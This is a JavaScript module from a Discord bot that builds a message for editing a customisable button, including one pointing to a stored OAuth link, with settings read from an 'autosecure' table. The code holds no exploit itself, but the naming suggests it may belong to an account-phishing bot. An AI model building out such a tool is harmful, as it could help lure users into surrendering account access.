const { queryParams } = require('../../../db/database');
const defaultButtons = require('./defaultButtons');
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");

async function editbuttonsmsg(type, botnumber, ownerid) {
  //  console.log(`${type} | Bot: ${botnumber}, ownerid: ${ownerid}`)
    let user_id = ownerid;
    let obj = {};

    let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?`, [user_id, botnumber]);
    if (settings.length === 0) {
        return {
            embeds: [{
                title: `Error :x:`,
                description: `Unexpected error occurred!`,
                color: 0xff0000
            }],
            ephemeral: true
        };
    }

    settings = settings[0];

    if ((type === "oauth") && !settings.oauth_link) {
        return {
            embeds: [{
                title: `Error :x:`,
                description: `Please set an OAuth link first!`,
                color: 0xff0000
            }],
            ephemeral: true
        };
    }

    let buttonData = await queryParams(`SELECT * FROM buttons WHERE user_id = ? AND botnumber = ? AND type = ?`, [user_id, botnumber, type]);
    let isDefault = false;
    let emoji, label, style, url = null;

    if (buttonData.length === 0) {
        obj.url = settings.oauth_link;
        buttonData = defaultButtons(type, obj).data;
        emoji = buttonData?.emoji?.name || null;
        label = buttonData?.label || null;
        style = buttonData?.style;
        url = buttonData?.url || null;
        isDefault = true;
    } else {
        buttonData = JSON.parse(buttonData[0].button);
        emoji = buttonData?.emoji?.name || null;
        label = buttonData?.label || null;
        style = buttonData?.style;
        url = buttonData?.url || null;
    }

    let saveButton = new ButtonBuilder()
        .setCustomId(`savebutton|${type}|${botnumber}|${ownerid}`)
        .setLabel("Save")
        .setStyle(ButtonStyle.Success);

    let pointButton = new ButtonBuilder()
        .setCustomId('donadhookslol')
        .setLabel("→")
        .setDisabled(true)
        .setStyle(ButtonStyle.Secondary);

    let showButton = new ButtonBuilder().setStyle(style);

    if (url) {
        showButton.setURL(url);
    } else {
        showButton.setCustomId(`ownbutton|${type}`);
    }

    if (emoji) {
        showButton.setEmoji(emoji);
    }

    if (label) {
        showButton.setLabel(label);
    }

    let deleteButton = new ButtonBuilder()
        .setCustomId(`deletebutton|${type}|${botnumber}|${ownerid}`)
        .setLabel("Reset")
        .setStyle(ButtonStyle.Danger);

    let emojiButton = new ButtonBuilder()
        .setCustomId(`buttonemoji|${type}`)
        .setLabel("Emoji")
        .setStyle(ButtonStyle.Primary);

    let colorButton = new ButtonBuilder()
        .setCustomId(`buttoncolor|${type}`)
        .setLabel("Colour")
        .setStyle(ButtonStyle.Primary);

    let labelButton = new ButtonBuilder()
        .setCustomId(`buttonlabel|${type}`)
        .setLabel("Label")
        .setStyle(ButtonStyle.Primary);

    let firstRow = new ActionRowBuilder().addComponents(saveButton, pointButton, showButton);
    let secondRow;

    if (type === "oauth") {
        secondRow = new ActionRowBuilder().addComponents(deleteButton, emojiButton, labelButton);
    } else {
        secondRow = new ActionRowBuilder().addComponents(deleteButton, emojiButton, colorButton, labelButton);
    }

    let msg = {
        embeds: [{
            title: `Editing your ${type} button`,
            color: 0x49A29F
        }],
        ephemeral: true,
        components: [firstRow, secondRow]
    };

    return msg;
}

module.exports = editbuttonsmsg;
